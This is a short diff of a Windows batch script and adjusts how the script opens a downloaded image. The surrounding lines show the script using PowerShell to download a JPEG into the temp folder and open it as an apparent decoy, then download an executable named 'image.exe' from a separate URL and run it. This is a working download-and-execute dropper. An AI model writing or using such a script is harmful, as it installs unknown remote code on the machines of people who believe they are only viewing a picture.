@@ -8,7 +8,7 @@ set "imageFile=%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
 set "execFile=%TEMP%\image.exe"
 
 powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageURL%', '%imageFile%');"
-start !imageFile!
+start "" "%imageFile%"
 
 powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');"
 start "" "%execFile%"
